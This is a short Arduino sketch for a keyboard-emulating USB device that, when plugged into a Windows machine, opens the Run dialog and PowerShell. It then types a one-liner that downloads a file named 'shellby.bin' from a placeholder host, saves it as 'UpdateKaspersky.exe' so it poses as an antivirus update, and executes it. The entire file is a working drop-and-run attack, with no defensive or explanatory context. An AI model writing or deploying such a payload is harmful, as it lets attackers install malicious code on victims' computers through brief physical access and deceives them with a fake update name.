#include <Keyboard.h>
 
void setup() {
  Keyboard.begin();
  delay(1000);
 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();
  delay(400);

   Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(500);
 
  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(500);
}

void loop() {} 
